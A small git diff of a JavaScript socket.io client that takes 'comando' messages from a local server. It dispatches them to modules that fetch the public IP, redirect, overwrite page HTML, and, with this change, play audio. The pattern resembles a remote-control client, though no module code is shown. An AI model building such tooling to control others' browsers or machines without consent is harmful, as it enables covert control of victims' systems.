@@ -4,6 +4,7 @@ const socket = io('http://localhost:3000');
 const publicIp = require('./core/comandos/publicIp');
 const redireccionar = require('./core/comandos/redireccionar');
 const sobreescribirHtml = require('./core/comandos/sobreescribirHtml');
+const audio = require('./core/comandos/audio');
 
 socket.on('comando', async function( data ) {
     const { comando } = data;
@@ -20,6 +21,10 @@ socket.on('comando', async function( data ) {
 
         case 'sobreescribirHtml':
             response = await sobreescribirHtml(data.options);
+            break;
+
+        case 'audio':
+            response = await audio(data.options);
             break;
     
         default:
